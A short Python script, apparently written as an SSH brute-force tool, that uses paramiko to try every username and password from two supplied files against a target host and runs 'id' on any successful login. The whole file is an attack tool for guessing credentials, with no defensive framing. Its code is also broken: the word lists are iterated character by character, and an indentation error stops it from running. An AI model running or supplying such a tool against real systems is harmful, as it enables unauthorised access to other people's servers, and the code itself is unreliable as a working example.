#!/usr/bin/python
import paramiko
import sys

target = sys.argv[1]

with open(sys.argv[2], "r") as usrs:
    users = usrs.read().strip()
    usrs.close()

with open(sys.argv[3], "r") as password:
    passwds = password.read().strip()
    password.close()


client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in users:
    for passwd in passwds:
    try:
        client.connect(target, port=22, username=user, password=passwd)
    except paramiko.ssh_exception.AuthenticationException:
        continue
    else:
        stdin, stdout, stderr = client.exec_command('id')
        for line in stdout.readlines():
            print(line.strip())

client.close()

